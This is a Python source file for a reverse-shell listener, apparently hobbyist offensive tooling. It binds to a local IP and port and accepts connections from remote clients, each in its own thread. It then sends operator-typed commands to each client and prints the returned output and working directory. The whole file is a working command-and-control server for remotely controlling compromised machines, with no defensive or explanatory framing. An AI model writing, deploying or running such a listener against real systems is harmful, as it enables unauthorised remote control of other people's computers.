import socket
from colorama import Fore
import os
from threading import Thread

#Made my Ak

class Shell:
    # Logo
    logo = """
  ██████  ██░ ██ ▓█████  ██▓     ██▓    
▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░    
  ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒
▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
░  ░  ░   ░  ░░ ░   ░     ░ ░     ░ ░   
      ░   ░  ░  ░   ░  ░    ░  ░    ░  ░
"""
    def __init__(self):
        self.SERVER_HOST = "192.168.1.144"
        self.SERVER_PORT = 8881
        self.BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
        self.SEPARATOR = "<sep>"
        
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.bind((self.SERVER_HOST, self.SERVER_PORT))
        self.s.listen(5)
        print(self.logo)
        print(f"Listening as {self.SERVER_HOST}:{self.SERVER_PORT} ...")
        
        # Initialize an empty list to store client threads
        self.client_threads = []

        self.accept_connections()

    def accept_connections(self):
        while True:
            client_socket, client_address = self.s.accept()
            print(f'{client_address[0]}:{client_address[1]} ' +  Fore.GREEN + 'Connected')

            # Create a new thread to handle the client connection
            client_thread = Thread(target=self.handle_client, args=(client_socket,))
            client_thread.start()

            # Add the client thread to the list
            self.client_threads.append(client_thread)

    def receive_data(self, client_socket):
        data = client_socket.recv(self.BUFFER_SIZE).decode()
        return data

    def handle_client(self, client_socket):
        cwd = self.receive_data(client_socket)
        while True:
            try:
                command = input(f"{cwd} sh$> ").strip()
                if not command:
                    continue
                
                client_socket.send(command.encode())
                
                if command.lower() == "exit":
                    break

                output = self.receive_data(client_socket)
                results, cwd = output.split(self.SEPARATOR)
                print(results)
            except KeyboardInterrupt:
                print("KeyboardInterrupt: Exiting...")
                break
            except Exception as e:
                print(f"An error occurred: {e}")
                break
        
        # Close the client socket
        client_socket.close()

if __name__ == '__main__':
    server = Shell()
